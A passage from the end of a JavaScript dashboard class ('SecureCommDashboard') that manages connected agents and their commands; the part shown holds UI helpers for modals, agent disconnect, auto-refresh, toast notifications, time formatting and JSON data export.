                    <button class="btn btn-secondary" onclick="this.closest('.modal').remove()">Close</button>
                    </div>
                    </div>
                    `;

                    document.body.appendChild(modal);
                    modal.addEventListener('click', (e) => {
                        if (e.target === modal) modal.remove();
                    });

        } catch (error) {
            console.error('Agent details error:', error);
            this.showToast(`Failed to load agent details: ${error.message}`, 'error');
        }
    }

    async disconnectAgent(agentId) {
        if (!confirm(`Are you sure you want to disconnect agent ${agentId}?`)) {
            return;
        }

        this.sendCommandTo(agentId);
        setTimeout(() => {
            const typeSelect = document.getElementById('cmd-type');
            if (typeSelect) typeSelect.value = 'exit';
            this.handleCommandTypeChange('exit');
        }, 100);
    }

    // ==================== AUTO REFRESH ====================

    startAutoRefresh() {
        this.stopAutoRefresh();

        if (this.autoRefresh) {
            this.refreshTimer = setInterval(() => {
                this.loadData();
            }, this.refreshInterval);
        }
    }

    stopAutoRefresh() {
        if (this.refreshTimer) {
            clearInterval(this.refreshTimer);
            this.refreshTimer = null;
        }
    }

    // ==================== UI UPDATES ====================

    updateConnectionStatus(status) {
        const indicator = document.querySelector('.status-indicator');
        const text = document.querySelector('.status-text');

        if (indicator && text) {
            indicator.className = `status-indicator ${status}`;
            text.textContent = status === 'connected' ? 'Connected' :
            status === 'loading' ? 'Loading...' :
            status === 'error' ? 'Error' : 'Disconnected';
        }
    }

    updateLastRefresh() {
        const el = document.getElementById('last-refresh');
        if (el) {
            el.textContent = new Date().toLocaleTimeString();
        }
    }

    // ==================== TOAST NOTIFICATIONS ====================

    showToast(message, type = 'info', duration = 5000) {
        const container = document.getElementById('toast-container');
        if (!container) return;

        const toast = document.createElement('div');
        toast.className = `toast toast-${type}`;

        const icons = {
            success: '✅',
            error: '❌',
            warning: '⚠️',
            info: 'ℹ️'
        };

        toast.innerHTML = `
        <span class="toast-icon">${icons[type] || 'ℹ️'}</span>
        <span class="toast-message">${this.escapeHtml(message)}</span>
        <button class="toast-close" onclick="this.parentElement.remove()">&times;</button>
        `;

        container.appendChild(toast);

        requestAnimationFrame(() => {
            toast.classList.add('show');
        });

        setTimeout(() => {
            toast.classList.remove('show');
            setTimeout(() => toast.remove(), 300);
        }, duration);
    }

    // ==================== UTILITIES ====================

    escapeHtml(text) {
        if (!text) return '';
        const div = document.createElement('div');
        div.textContent = text;
        return div.innerHTML;
    }

    truncate(text, maxLength) {
        if (!text) return '-';
        if (text.length <= maxLength) return text;
        return text.substring(0, maxLength - 3) + '...';
    }

    formatTimestamp(timestamp) {
        if (!timestamp) return '-';
        try {
            const date = new Date(timestamp);
            return date.toLocaleString();
        } catch {
            return timestamp;
        }
    }

    formatRelativeTime(timestamp) {
        if (!timestamp) return '-';
        try {
            const date = new Date(timestamp);
            const now = new Date();
            const diff = Math.floor((now - date) / 1000);

            if (diff < 60) return 'just now';
            if (diff < 3600) return `${Math.floor(diff / 60)}m ago`;
            if (diff < 86400) return `${Math.floor(diff / 3600)}h ago`;
            return `${Math.floor(diff / 86400)}d ago`;
        } catch {
            return timestamp;
        }
    }

    formatUptime(seconds) {
        const days = Math.floor(seconds / 86400);
        const hours = Math.floor((seconds % 86400) / 3600);
        const minutes = Math.floor((seconds % 3600) / 60);

        if (days > 0) return `${days}d ${hours}h`;
        if (hours > 0) return `${hours}h ${minutes}m`;
        return `${minutes}m`;
    }

    calculateSuccessRate() {
        const total = this.stats.successful_commands + this.stats.failed_commands;
        if (total === 0) return '100%';
        return `${Math.round((this.stats.successful_commands / total) * 100)}%`;
    }

    // ==================== EXPORT ====================

    exportData(format = 'json') {
        const data = {
            stats: this.stats,
            agents: this.agents,
            commands: this.commands,
            exported_at: new Date().toISOString()
        };

        const blob = new Blob([JSON.stringify(data, null, 2)], { type: 'application/json' });
        const url = URL.createObjectURL(blob);
        const a = document.createElement('a');
        a.href = url;
        a.download = `securecomm-export-${new Date().toISOString().split('T')[0]}.json`;
        document.body.appendChild(a);
        a.click();
        document.body.removeChild(a);
        URL.revokeObjectURL(url);

        this.showToast('Data exported successfully', 'success');
    }
}

// Initialize dashboard when DOM is ready
document.addEventListener('DOMContentLoaded', () => {
    window.dashboard = new SecureCommDashboard();
});

// Export for testing
if (typeof module !== 'undefined' && module.exports) {
    module.exports = SecureCommDashboard;
}
